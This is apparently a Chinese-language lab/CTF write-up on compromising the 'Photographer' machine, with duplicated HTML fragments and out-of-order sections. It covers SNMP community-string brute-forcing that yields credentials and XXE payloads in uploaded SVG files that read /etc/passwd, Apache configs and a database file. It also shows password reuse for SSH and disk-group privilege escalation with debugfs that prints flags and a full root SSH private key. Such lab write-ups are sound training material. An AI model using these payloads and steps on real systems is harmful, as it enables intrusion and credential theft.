+<!DOCTYPE test [ <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf' > ]>
+<svg width='500px' height='2000px' xmlns='http://www.w3.org/2000/svg'>
+   <text font-size='10' x='0' y='20'>&xxe;</text>
+</svg>
+````
+
+拿到了一个大概的位置`sites-enabled/*.conf`，但是默认的`000-default.conf`返回是空的，所以直接爆破一手
+
+拿`directory-list-2.3-medium.txt`爆破的
+
+应该是速度太快跑蒙了，他显示`web、library、wik`i的长度都为641，结果查看是同一base64
+
+解出来
+
+```php
+<VirtualHost *:80>
+    ServerName photographer.thl
+    DocumentRoot /var/www/blog
+
+    ErrorLog ${APACHE_LOG_DIR}/photographer_error.log
+    CustomLog ${APACHE_LOG_DIR}/photographer_access.log combined
+</VirtualHost>
+
+```
+
+look look
+
+```xml
+<?xml version='1.0' standalone='yes'?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/blog/admin/index.php' > ]>
+<svg width='500px' height='2000px' xmlns='http://www.w3.org/2000/svg'>
+   <text font-size='10' x='0' y='20'>&xxe;</text>
+</svg>
+```
+
+看了一下，数据库密码在db.php，我们看一下数据库密码，看他有没有密码复用
+
+## 4.4. 数据库凭证获取
+
+```xml
+<?xml version='1.0' standalone='yes'?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/blog/admin/db.php' > ]>
+<svg width='500px' height='2000px' xmlns='http://www.w3.org/2000/svg'>
+   <text font-size='10' x='0' y='20'>&xxe;</text>
+</svg>
+```
+
+解出
+
+```php
+<?php
+$host = 'localhost';
+$db = 'blog';
+$user = 'root';
+$pass = 'pjtF0533OPiSMQTGZacZY6jy$';
+
+$conn = new mysqli($host, $user, $pass, $db);
+if ($conn->connect_error) {
+    die('Conexión fallida: ' . $conn->connect_error);
+}
+```
+
+# 5. SSH登录与权限提升
+
+## 5.1. 密码复用测试
+
+测试一下                 *做一下白日梦:)*
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh root@192.168.205.132                                                          
+root@192.168.205.132's password: 
+Permission denied, please try again.
+root@192.168.205.132's password: 
+  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh ethan@192.168.205.132
+ethan@192.168.205.132's password: 
+Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⣞⡩⠽⢷⣆⣀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣀⡤⢿⠀⢹⠖⠒⡛⠧⠐⠉⣧⠀⠀⠀⠀
+⠀⢀⡠⠴⣲⣭⡁⠲⠇⢈⡑⢚⠪⠭⠤⠤⢄⣀⣿⠀⠀⠀⠀
+⢠⠃⠤⠄⠉⠉⠀⠐⠉⣡⠞⠁⢀⡴⠞⠉⢉⣩⠿⠶⣄⠀
+⢸⠀⠀⠀⠀⡄⠀⠀⣰⠃⠀⢠⡞⠀⠀⡴⢋⣴⣿⣿⣷⡘⣆
+⢸⠀⠀⠀⠀⡇⠀⠀⡏⠀⠀⣾⠀⠀⡜⢀⣾⣿⣤⣾⣿⡇⣿
+⢨⠀⠀⠀⠀⡇⠀⠀⣇⠀⠀⡏⠀⠀⡇⢸⣿⣿⣿⣿⣿⢁⡏
+⠈⠀⣀⠀⠀⣷⠀⠀⠘⢄⠀⢳⠀⠀⡇⠸⣿⣿⣹⡿⢃⡼⠁
+⢰⡀⠛⠓⠀⢻⠀⠀⠀⠀⢙⣻⡷⠦⣼⣦⣈⣉⣡⡴⠚⠀⠀
+⠀⢷⣄⡀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠉⠛⠓⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Photographer
+
+Last login: Tue Oct 28 19:47:04 2025 from 192.168.1.17
+ethan@photographer:~$ id
+uid=1001(ethan) gid=1001(ethan) grupos=1001(ethan),6(disk)
+```
+
+一眼丁真，`6(disk)`可以直接读东西
+
+## 5.2. disk组权限利用
+
+```bash
+ethan@photographer:~$ df -h
+S.ficheros     Tamaño Usados  Disp Uso% Montado en
+udev             965M      0  965M   0% /dev
+tmpfs            197M   552K  197M   1% /run
+/dev/sda1         19G   2,6G   16G  15% /
+tmpfs            984M      0  984M   0% /dev/shm
+tmpfs            5,0M      0  5,0M   0% /run/lock
+tmpfs            197M      0  197M   0% /run/user/1001
+ethan@photographer:~$ debugfs /dev/sda1
+-bash: debugfs: orden no encontrada
+ethan@photographer:~$ which debugfs
+ethan@photographer:~$ find / -name 'debugfs' 2>/dev/null
+/usr/sbin/debugfs
+```
+
+## 5.3. Flag获取
+
+藏起来了
+
+```bash
+debugfs:  cat /root/root.txt
+dc54639c5bd88637cc23dd7dd1827bbf
+debugfs:  cat /home/ethan/user.txt
+3fd75fcad59cce5c0bbb0f1a52b04ebd
+debugfs:  cat /root/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA18FkE5kI7duOx6hL1khslKD8vqeTEZ/0hcrPE+d0t25zuoJYzXnf
+27jiq9TimFJVUqMUViaXtIpXO8eOb1QrVA1FbbijAQPTVIQF3i9WttR11dA2lasfvfsvTy
+Vi7DLOi6JBsY5gf+A+R3xk67Ng+K616g5Qn94Tftr7dEdEl+Ap+wbo21YaRDKwUYCuNVpk
+CF5HejAHEfirZGN0JW1qomAdqDpWmrhTbBTS5semQAxxBTcmI5+JUsnyCcTOL7V5wOHiuj
+Bi9g5IIbO8y6/gpvkTKV2iLKaaIRXewrv810Cgoze5PQZYgeD0TcqfUdSK0X+3YNPHAKrt
+cZF9RjckXJlvSJzPPcqgWh+pFEmrfHAARm6Teg1Ql3NPWQ8qbamsjKAOSiD9huhkRKQDk7
+Tl+sH7+b1a5OlDHepsPz1zKEL6T8sDixHfJAzBcYluXzM55sUC3dJnpV7h2EV6XqLjqVX/
+FlybjgDwL2yZCHuLpQEB67Dpa33s5tUnNHsb7gH3AAAFgL8fiKe/H4inAAAAB3NzaC1yc2
+EAAAGBANfBZBOZCO3bjseoS9ZIbJSg/L6nkxGf9IXKzxPndLduc7qCWM1539u44qvU4phS
+VVKjFFYml7SKVzvHjm9UK1QNRW24owED01SEBd4vVrbUddXQNpWrH737L08lYuwyzouiQb
+GOYH/gPkd8ZOuzYPiuteoOUJ/eE37a+3RHRJfgKfsG6NtWGkQysFGArjVaZAheR3owBxH4
+q2RjdCVtaqJgHag6Vpq4U2wU0ubHpkAMcQU3JiOfiVLJ8gnEzi+1ecDh4rowYvYOSCGzvM
+uv4Kb5EyldoiymmiEV3sK7/NdAoKM3uT0GWIHg9E3Kn1HUitF/t2DTxwCq7XGRfUY3JFyZ
+b0iczz3KoFofqRRJq3xwAEZuk3oNUJdzT1kPKm2prIygDkog/YboZESkA5O05frB+/m9Wu
+TpQx3qbD89cyhC+k/LA4sR3yQMwXGJbl8zOebFAt3SZ6Ve4dhFel6i46lV/xZcm44A8C9s
+mQh7i6UBAeuw6Wt97ObVJzR7G+4B9wAAAAMBAAEAAAGAISlXUW/PIIgDjQqABYKCNeH8lu
+04vJfCRKIka+HCXcM7RGpubb6SurnTFSgWX+UfuiDYqlkqLhSpTcXhTZk5Q6T6i9+6JhjJ
+bY8RO9I42McVCXUEPsLbkR6/acHMT5OLjYi14i2JBX6Y8/HZrSSX/gEUctIacEf45SGRTp
+D5qQJKUYwBVF0KknrcANrva8Hl6CddgxlIrOl0pmxm2K3Vmvl89XNqBkPYhp84v0Hmeqeu
+42dTlFwcBj6F1hyKuGiC8ufTkOCtOI6QZeMsiSgNXgZhClwl7syUAfB0RmQMVLGX/VXRSm
+pMc7nL5exWiWLaJQl5mLeCCiWA2O6NPekn4J94oCLAtrmMoHZJwF2EhGJjehV5bWs51bPs
+kFdf9vHUO07f5BSL8fHJo0gEdgYnhqBLlpv1p3C1CevkXl9MpVBdkz+EQrwdrrcZErFWDn
+GVtdYskCVeIasRgTIpj1/wAMQh3rwfVQEyeAtgVSluw3/s7EMYWL6KD5KWTPv6SBhZAAAA
+wHjI/JEv1FCzwPzNU+iIwJs3MbEsaKcOBJjQM9NL17Ad+3Gd/YMejLEYs5NlEsuHJkzD1C
+VAEItgCoClbGkYfMHJJWO2bKE+mPUYqJy/0QBfKVtAkNJzg7TA+0xYSCfCVp0ZFkznnyWN
+iVMO2WerquMmF86G44SCc3XS2fFdzY7Bb2vSHZtbXWtZq2KaAl4YSWi61o/OzsRmVnUVhx
+Z4ToXoq1LAChb5hz5jIY8mkgYMMfeCBoyYpjkh7DU7IF5sKQAAAMEA8/UtaN0WUzz3KbKn
+Cibi+smiGJfW2s5BKX6XhrNKyz5MyWHhnJ69l7p3hrJnQgNv9AyiRfBMC+QFmzlw8+3y8Z
+3gQbN6Ug6O7rpZEP8j+9OLF+Lhft19ACfFu6MWjY2Rrcmx8F1DoSCOzRci830IdkI3hlut
+VXrPpJWJx+RvZ/NQ3TfEL91nFy8LCs6EXowSgzwiZWRB3UDukXAA5swedYhgXGqMdg9W0H
+/TJXo3olrV2YnCrXXLcz2SFJ7TOQdzAAAAwQDiZ9RUswh+bfjlaWaQzPYY3TLiB9bIcQRm
+aWZSAl/Wb/K+eAWE6qvDihim3PDU/3KMPAtDxx+6G0glpwGpN/4pm5ZbOiDPHHtLwcPV3l
+5IWI3FYb+UpfJRo98aO/XT0H4PRk5zN/8qOoO7d28mMAyQul4ibCreb5Uh1NBQRMjGJ/4j
+bqNBEb3+xECpTj+HIUq6yRbMZsU0rrtvM1YaWhPKm/gpy3pj5Oe+LqnDwFhiI6H2wXPamb
+wyij4+RkfxUm0AAAALcm9vdEBkZWJpYW4=
+-----END OPENSSH PRIVATE KEY-----
+```。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/thl_Photographer.html">
+<meta property="og:image" content="http://7r1UMPHK.github.io/image/20251025224622174.webp">
+<title>thl_Photographer</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">thl_Photographer</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/269" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>1. 信息收集</h1>
+<h2>1.1. 端口扫描</h2>
+<p>web质量还可以</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l     
+...
+192.168.205.132 08:00:27:fc:e2:47       PCS Systemtechnik GmbH
+...</pre></div>
+<p>192.168.205.132</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.132          
+...
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+...</pre></div>
+<h2>1.2. Web服务探测</h2>
+<p>是一个摄影师的博客，他叫<strong>Ethan</strong>，没有找到其他有价值的信息</p>
+<h2>1.3. 漏洞扫描</h2>
+<p>这里因为Wappalyzer误导了一下，我以为这个是wordpress（误报），所以我进行了nuclei web漏洞扫描（纯纯机缘巧合）</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nuclei -u 192.168.205.132     
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ <span class="pl-cce">\/</span> / / / ___/ / _ <span class="pl-cce">\/</span> /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/<span class="pl-cce">\_</span>_,_/<span class="pl-cce">\_</span>__/_/<span class="pl-cce">\_</span>__/_/   v3.4.10
+
+                projectdiscovery.io
+...
+[external-service-interaction] [http] [info] http://192.168.205.132
+[external-service-interaction] [http] [info] http://192.168.205.132
+[waf-detect:apachegeneric] [http] [info] http://192.168.205.132
+[ssh-auth-methods] [javascript] [info] 192.168.205.132:22 [<span class="pl-s"><span class="pl-pds">"</span>[<span class="pl-pds">"</span></span>publickey<span class="pl-s"><span class="pl-pds">"</span>,<span class="pl-pds">"</span></span>password<span class="pl-s"><span class="pl-pds">"</span>]<span class="pl-pds">"</span></span>]
+[ssh-password-auth] [javascript] [info] 192.168.205.132:22
+[ssh-server-enumeration] [javascript] [info] 192.168.205.132:22 [<span class="pl-s"><span class="pl-pds">"</span>SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7<span class="pl-pds">"</span></span>]
+[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.132:22
+[openssh-detect] [tcp] [info] 192.168.205.132:22 [<span class="pl-s"><span class="pl-pds">"</span>SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u7<span class="pl-pds">"</span></span>]
+[apache-detect] [http] [info] http://192.168.205.132 [<span class="pl-s"><span class="pl-pds">"</span>Apache/2.4.65 (Debian)<span class="pl-pds">"</span></span>]
+[snmpv1-community-detect-string] [javascript] [high] 192.168.205.132:161 [<span class="pl-s"><span class="pl-pds">"</span>photographer<span class="pl-pds">"</span></span>] [community_string<span class="pl-k">=</span><span class="pl-s"><span class="pl-pds">"</span>public<span class="pl-pds">"</span></span>]
+[snmpv3-detect] [javascript] [info] 192.168.205.132:161 [<span class="pl-s"><span class="pl-pds">"</span>net-snmp, Engine ID: 1f88805368bc4066c2f66800000000<span class="pl-pds">"</span></span>]
+[options-method] [http] [info] http://192.168.205.132 [<span class="pl-s"><span class="pl-pds">"</span>GET,POST,OPTIONS,HEAD<span class="pl-pds">"</span></span>]
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.132
+[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.132
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.132
+[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.132
+[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.132
+[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.132
+[INF] Scan completed <span class="pl-k">in</span> 1m. 23 matches found.</pre></div>
+<p>snmp找出了一个默认社区字符串<code class="notranslate">public</code>，snmp的默认端口是udp的161</p>
+<h1>2. SNMP服务利用</h1>
+<p><em>ps:没接触过snmp的看这:<a href="https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-snmp/index.html" rel="nofollow">161,162,10161,10162/udp - Pentesting SNMP</a></em></p>
+<p>常规利用一下</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ snmpwalk -v 2c -c public 192.168.205.132                                       
+...
+iso.3.6.1.2.1.1.9.1.3.1 = STRING: <span class="pl-s"><span class="pl-pds">"</span>The SNMP Management Architecture MIB.<span class="pl-pds">"</span></span>
+iso.3.6.1.2.1.1.9.1.3.2 = STRING: <span class="pl-s"><span class="pl-pds">"</span>The MIB for Message Processing and Dispatching.<span class="pl-pds">"</span></span>
+iso.3.6.1.2.1.1.9.1.3.3 = STRING: <span class="pl-s"><span class="pl-pds">"</span>The management information definitions for the SNMP User-based Security Model.<span class="pl-pds">"</span></span>
+iso.3.6.1.2.1.1.9.1.3.4 = STRING: <span class="pl-s"><span class="pl-pds">"</span>The MIB module for SNMPv2 entities<span class="pl-pds">"</span></span>
+iso.3.6.1.2.1.1.9.1.3.5 = STRING: <span class="pl-s"><span class="pl-pds">"</span>View-based Access Control Model for SNMP.<span class="pl-pds">"</span></span>
+iso.3.6.1.2.1.1.9.1.3.6 = STRING: <span class="pl-s"><span class="pl-pds">"</span>The MIB module for managing TCP implementations<span class="pl-pds">"</span></span>
+iso.3.6.1.2.1.1.9.1.3.7 = STRING: <span class="pl-s"><span class="pl-pds">"</span>The MIB module for managing UDP implementations<span class="pl-pds">"</span></span>
+iso.3.6.1.2.1.1.9.1.3.8 = STRING: <span class="pl-s"><span class="pl-pds">"</span>The MIB module for managing IP and ICMP implementations<span class="pl-pds">"</span></span>
+iso.3.6.1.2.1.1.9.1.3.9 = STRING: <span class="pl-s"><span class="pl-pds">"</span>The MIB modules for managing SNMP Notification, plus filtering.<span class="pl-pds">"</span></span>
+iso.3.6.1.2.1.1.9.1.3.10 = STRING: <span class="pl-s"><span class="pl-pds">"</span>The MIB module for logging SNMP Notifications.<span class="pl-pds">"</span></span>
+...
+iso.3.6.1.2.1.25.1.4.0 = STRING: <span class="pl-s"><span class="pl-pds">"</span>BOOT_IMAGE=/boot/vmlinuz-6.1.0-40-amd64 root=UUID=77e51563-68a2-4cef-9d02-2b434abfe0dd ro quiet</span>
+<span class="pl-s"><span class="pl-pds">"</span></span>
+...</pre></div>
+<p>这个长度不像是正常的snmp输出，应该还有其它的社区字符串，爆破一手</p>
+<h2>2.1. 社区字符串爆破</h2>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.205.132
+Scanning 1 hosts, 120 communities
+192.168.205.132 [public] Linux photographer 6.1.0-40-amd64 <span class="pl-c"><span class="pl-c">#</span>1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64</span>
+192.168.205.132 [public] Linux photographer 6.1.0-40-amd64 <span class="pl-c"><span class="pl-c">#</span>1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64</span>
+192.168.205.132 [security] Linux photographer 6.1.0-40-amd64 <span class="pl-c"><span class="pl-c">#</span>1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64</span></pre></div>
+<p>还存在一个<code class="notranslate">security</code></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ snmpwalk -v 2c -c security 192.168.205.132 <span class="pl-k">|</span>wc -l
+3666</pre></div>
+<p>这个长度非常的正确，但是我没扒拉到有价值的，snmp还有一个扩展查询可以查看</p>
+<h2>2.2. 扩展查询获取凭证</h2>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ snmpwalk -v 2c -c security 192.168.205.132 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull.<span class="pl-s"><span class="pl-pds">"</span>mycreds<span class="pl-pds">"</span></span> = STRING: ethan:1N3qVgwNB6cZmNSyr8iX<span class="pl-smi">$!</span></pre></div>
+<p><code class="notranslate">ethan:1N3qVgwNB6cZmNSyr8iX$!</code></p>
+<p>给了我们一串凭证，经过测试ssh直接连接无效，白日梦破碎</p>
+<p>那就是web了，目录爆破</p>
+<h1>3. Web目录爆破</h1>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ dirsearch -q -u http://192.168.205.132       
+...
+[23:05:54] 200 -    1KB - http://192.168.205.132/about.html
+[23:05:54] 301 -  318B  - http://192.168.205.132/admin  -<span class="pl-k">&gt;</span>  http://192.168.205.132/admin/
+[23:05:54] 200 -  536B  - http://192.168.205.132/admin/
+[23:05:54] 302 -    1KB - http://192.168.205.132/admin/admin.php  -<span class="pl-k">&gt;</span>  index.php
+[23:05:54] 200 -  536B  - http://192.168.205.132/admin/index.php
+[23:05:54] 500 -    0B  - http://192.168.205.132/admin/upload.php
+[23:05:56] 301 -  319B  - http://192.168.205.132/assets  -<span class="pl-k">&gt;</span>  http://192.168.205.132/assets/
+[23:05:56] 200 -  476B  - http://192.168.205.132/assets/
+[23:05:59] 301 -  319B  - http://192.168.205.132/images  -<span class="pl-k">&gt;</span>  http://192.168.205.132/images/
+[23:05:59] 200 -  529B  - http://192.168.205.132/images/
+[23:06:02] 403 -  280B  - http://192.168.205.132/server-status/
+[23:06:02] 403 -  280B  - http://192.168.205.132/server-status</pre></div>
+<p>有个admin管理登录页，有uploads上传页，目前推测通过上传拿shell</p>
+<p>使用凭证进行登录</p>
+<h1>4. XXE漏洞利用</h1>
+<p>果然是上传利用，通过测试和看前端的源码，发现只可以上传<code class="notranslate">.jpg,.png,.gif,.jpeg</code>（存疑），并且貌似是启用了<strong>MIME Type检测</strong></p>
+<h2>4.1. SVG文件上传测试</h2>
+<p>经过短暂的测试，大部分常规利用都无法利用，但是在上传svg的时候（我制作了一个包含php利用的svg）有明显的处理的痕迹，他处理svg文件的时间非常久，这在我们本地靶机的情况下是很少见的，SVG 作为一种基于 XML 的格式，很有可能可以用来利用XXE</p>
+<p><em>参考资料:<a href="https://book.hacktricks.wiki/zh/pentesting-web/xxe-xee-xml-external-entity.html?highlight=svg#svg---%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0" rel="nofollow">SVG - 文件上传</a></em></p>
+<h2>4.2. 文件读取</h2>
+<p>先尝试利用文件读取（hacktricks的攻击示例写的好像有点问题，它利用了image标签，不是很理解，我们自己改一下）</p>
+<div class="highlight highlight-text-xml"><pre class="notranslate">&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">svg</span> [ &lt;!<span class="pl-k">ENTITY</span> <span class="pl-c1">xxe</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>file:///etc/passwd<span class="pl-pds">"</span></span>&gt; ]&gt;
+&lt;<span class="pl-ent">svg</span> <span class="pl-e">xmlns</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2000/svg<span class="pl-pds">"</span></span>&gt;
+  &lt;<span class="pl-ent">text</span> <span class="pl-e">x</span>=<span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span> <span class="pl-e">y</span>=<span class="pl-s"><span class="pl-pds">"</span>20<span class="pl-pds">"</span></span>&gt;<span class="pl-c1">&amp;xxe;</span>&lt;/<span class="pl-ent">text</span>&gt;
+&lt;/<span class="pl-ent">svg</span>&gt;</pre></div>
+<p>成功回显，发现存在<strong>ethan</strong>用户，读取ssh私钥无果</p>
+<p>试试命令执行</p>
+<p><em>ps:expect包装器通常不开，试试吧，不吃亏</em></p>
+<div class="highlight highlight-text-xml"><pre class="notranslate">&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">svg</span> [ &lt;!<span class="pl-k">ENTITY</span> <span class="pl-c1">xxe</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>expect://id<span class="pl-pds">"</span></span>&gt; ]&gt;
+&lt;<span class="pl-ent">svg</span> <span class="pl-e">xmlns</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2000/svg<span class="pl-pds">"</span></span>&gt;
+  &lt;<span class="pl-ent">text</span> <span class="pl-e">x</span>=<span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span> <span class="pl-e">y</span>=<span class="pl-s"><span class="pl-pds">"</span>20<span class="pl-pds">"</span></span>&gt;<span class="pl-c1">&amp;xxe;</span>&lt;/<span class="pl-ent">text</span>&gt;
+&lt;/<span class="pl-ent">svg</span>&gt;</pre></div>
+<p>没有显示无法利用</p>
+<h2>4.3. Apache配置文件读取</h2>
+<p>这里想读一下<code class="notranslate">/admin/index.php</code>的源码，但是默认路径<code class="notranslate">/var/www/html</code>不对，没有回显，扒拉一下路径</p>
+<p>已知是apache的服务，看看配置文件</p>
+<div class="highlight highlight-text-xml"><pre class="notranslate">&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">svg</span> [ &lt;!<span class="pl-k">ENTITY</span> <span class="pl-c1">xxe</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>file:///etc/apache2/apache2.conf<span class="pl-pds">"</span></span>&gt; ]&gt;
+&lt;<span class="pl-ent">svg</span> <span class="pl-e">xmlns</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2000/svg<span class="pl-pds">"</span></span>&gt;
+  &lt;<span class="pl-ent">text</span> <span class="pl-e">x</span>=<span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span> <span class="pl-e">y</span>=<span class="pl-s"><span class="pl-pds">"</span>20<span class="pl-pds">"</span></span>&gt;<span class="pl-c1">&amp;xxe;</span>&lt;/<span class="pl-ent">text</span>&gt;
+&lt;/<span class="pl-ent">svg</span>&gt;</pre></div>
+<p>然后就炸了......状态码500</p>
+<p>应该是文本太多的问题，试试<code class="notranslate">php_filter</code>链（想直接执行命令的有点难度，太长了，它会解析到）</p>
+<div class="highlight highlight-text-xml"><pre class="notranslate">&lt;?<span class="pl-ent">xml</span><span class="pl-e"> version</span>=<span class="pl-s"><span class="pl-pds">"</span>1.0<span class="pl-pds">"</span></span><span class="pl-e"> standalone</span>=<span class="pl-s"><span class="pl-pds">"</span>yes<span class="pl-pds">"</span></span>?&gt;
+&lt;!<span class="pl-ent">DOCTYPE</span> <span class="pl-e">test</span> [ &lt;!<span class="pl-k">ENTITY</span> <span class="pl-c1">xxe</span><span class="pl-k"> SYSTEM </span><span class="pl-s"><span class="pl-pds">"</span>php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf<span class="pl-pds">"</span></span> &gt; ]&gt;
+&lt;<span class="pl-ent">svg</span> <span class="pl-e">width</span>=<span class="pl-s"><span class="pl-pds">"</span>500px<span class="pl-pds">"</span></span> <span class="pl-e">height</span>=<span class="pl-s"><span class="pl-pds">"</span>2000px<span class="pl-pds">"</span></span> <span class="pl-e">xmlns</span>=<span class="pl-s"><span class="pl-pds">"</span>http://www.w3.org/2000/svg<span class="pl-pds">"</span></span>&gt;
+   &lt;<span class="pl-ent">text</span> <span class="pl-e">font-size</span>=<span class="pl-s"><span class="pl-pds">"</span>10<span class="pl-pds">"</span></span> <span class="pl-e">x</span>=<span class="pl-s"><span class="pl-pds">"</span>0<span class="pl-pds">"</span></span> <span class="pl-e">y</span>=<span class="pl-s"><span class="pl-pds">"</span>20<span class="pl-pds">"</span></span>&gt;<span class="pl-c1">&amp;xxe;</span>&lt;/<span class="pl-ent">text</span>&gt;
+&lt;/<span class="pl-ent">svg</span>&gt;</pre></div>
+<p>拿到了一个大概的位置<code class="notranslate">sites-enabled/*.conf</code>，但是默认的<code class="notranslate">000-default.conf</code>返回是空的，所以直接爆破一手</p>
+<p>拿<code class="notranslate">directory-list-2.3-medium.txt</code>爆破的</p>
+<p>应该是速度太快跑蒙了，他显示<code class="notranslate">web、library、wik</code>i的长度都为641，结果查看是同一base64</p>
+<p>解出来</p>
+<div class="highlight highlight-text-html-php"><pre class="notranslate">&lt;VirtualHost *:<span class="pl-c1">80</span>&gt;
+    ServerName photographer.thl
+    DocumentRoot /var/www/blog
+
+    ErrorLog <span class="pl-c1">$</span>{<span class="pl-c1">APACHE_LOG_DIR</span>}/photographer_error.log
+    CustomLog <span class="pl-c1">$</span>{<span class="pl-c1">APACHE_LOG_DIR</span>}/photographer_access.log combined
+&lt;/VirtualHost&gt;</pre></div>
+<p>look look</p>
